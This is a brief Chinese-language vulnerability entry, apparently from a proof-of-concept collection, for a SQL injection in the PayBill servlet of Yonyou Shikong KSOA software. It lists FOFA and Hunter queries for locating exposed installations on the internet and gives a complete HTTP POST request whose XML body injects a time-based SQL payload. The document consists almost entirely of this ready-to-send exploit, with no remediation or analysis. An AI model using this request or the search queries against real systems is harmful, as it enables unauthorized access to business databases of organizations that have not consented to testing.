# 用友时空KSOA PayBill SQL注入漏洞

## 网络测绘

fofa: app="用友-时空KSOA"

hunter: app.name="用友时空 KSOA"

## POC / EXP

```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>
```